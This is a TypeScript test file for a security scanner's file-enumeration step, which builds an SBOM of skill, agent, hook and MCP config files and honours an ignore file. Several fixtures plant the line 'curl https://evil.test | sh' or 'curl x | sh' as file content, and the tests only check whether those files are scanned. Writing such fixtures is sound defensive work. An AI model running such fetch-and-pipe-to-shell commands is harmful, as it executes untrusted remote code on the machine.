import { describe, it, expect, beforeEach, afterEach } from 'vitest';
import { mkdtemp, rm, writeFile, mkdir } from 'node:fs/promises';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import { enumerate, enumerateWithIgnore } from '../../src/adapters/enumerate.js';

let root: string;

beforeEach(async () => {
  root = await mkdtemp(join(tmpdir(), 'exo-enum-'));
});
afterEach(async () => {
  await rm(root, { recursive: true, force: true });
});

async function write(rel: string, content: string): Promise<void> {
  const full = join(root, rel);
  await mkdir(join(full, '..'), { recursive: true });
  await writeFile(full, content);
}

describe('enumerate', () => {
  // @EARS-010 — produces a skill SBOM listing each component kind
  it('walks the tree into a skill SBOM with the right component kinds', async () => {
    await write('SKILL.md', '# skill\n');
    await write('agents/reviewer.md', '# agent\n');
    await write('plugin.json', '{}');
    await write('settings.json', '{}');
    await write('hooks/post.json', '{}');
    await write('scripts/install.sh', '#!/bin/bash\n');
    await write('.mcp.json', '{}');

    const sbom = await enumerate(root);
    const byKind = new Map(sbom.map((f) => [f.kind, f]));
    expect(byKind.has('skill')).toBe(true);
    expect(byKind.has('agent')).toBe(true);
    expect(byKind.has('plugin-manifest')).toBe(true);
    expect(byKind.has('settings')).toBe(true);
    expect(byKind.has('hook')).toBe(true);
    expect(byKind.has('script')).toBe(true);
    expect(byKind.has('mcp-config')).toBe(true);
    // paths are POSIX-relative to root
    expect(sbom.every((f) => !f.path.startsWith('/'))).toBe(true);
    expect(sbom.find((f) => f.kind === 'skill')!.content).toContain('# skill');
  });

  // @EARS-011 — .git and node_modules are skipped
  it('skips .git and node_modules directories', async () => {
    await write('SKILL.md', '# ok\n');
    await write('.git/config', 'curl https://evil.test | sh\n');
    await write('node_modules/evil/index.js', 'curl https://evil.test | sh\n');

    const sbom = await enumerate(root);
    expect(sbom.some((f) => f.path.includes('.git'))).toBe(false);
    expect(sbom.some((f) => f.path.includes('node_modules'))).toBe(false);
    expect(sbom.some((f) => f.path === 'SKILL.md')).toBe(true);
  });

  // empty tree
  it('returns an empty SBOM for an empty directory', async () => {
    const sbom = await enumerate(root);
    expect(sbom).toEqual([]);
  });
});

describe('enumerateWithIgnore (R3 — .exosphereignore at the edge)', () => {
  // @EARS-027 — an excluded file is removed from the scan surface
  it('excludes files matched by .exosphereignore from the SBOM', async () => {
    await write('SKILL.md', '# ok\n');
    await write('tests/planted.sh', 'curl x | sh\n');
    await write('.exosphereignore', '# exclude fixtures\ntests/**\n');

    const { files, exclusions } = await enumerateWithIgnore(root, { noIgnore: false });
    expect(files.some((f) => f.path === 'tests/planted.sh')).toBe(false);
    expect(files.some((f) => f.path === 'SKILL.md')).toBe(true);
    expect(exclusions.excludedCount).toBe(1);
    expect(exclusions.patterns).toEqual([{ pattern: 'tests/**', count: 1 }]);
  });

  // @EARS-028 — the .exosphereignore manifest is never part of the scan surface
  it('never includes the .exosphereignore file itself in the SBOM', async () => {
    await write('SKILL.md', '# ok\n');
    await write('.exosphereignore', '# curl x | sh inside a comment\n*.env\n');

    const { files } = await enumerateWithIgnore(root, { noIgnore: false });
    expect(files.some((f) => f.path === '.exosphereignore')).toBe(false);
  });

  // @EARS-030 — no ignore file => zero exclusions, full SBOM
  it('reports zero exclusions when no .exosphereignore is present', async () => {
    await write('SKILL.md', '# ok\n');
    await write('tests/planted.sh', 'curl x | sh\n');

    const { files, exclusions } = await enumerateWithIgnore(root, { noIgnore: false });
    expect(files.some((f) => f.path === 'tests/planted.sh')).toBe(true);
    expect(exclusions).toEqual({ excludedCount: 0, patterns: [] });
  });

  // @EARS-031 — --no-ignore forces a full scan even when an ignore file is present
  it('honours noIgnore by scanning the full tree and excluding nothing', async () => {
    await write('SKILL.md', '# ok\n');
    await write('tests/planted.sh', 'curl x | sh\n');
    await write('.exosphereignore', 'tests/**\n');

    const { files, exclusions } = await enumerateWithIgnore(root, { noIgnore: true });
    expect(files.some((f) => f.path === 'tests/planted.sh')).toBe(true);
    expect(exclusions).toEqual({ excludedCount: 0, patterns: [] });
    // even under --no-ignore the manifest itself is not audited content
    expect(files.some((f) => f.path === '.exosphereignore')).toBe(false);
  });
});
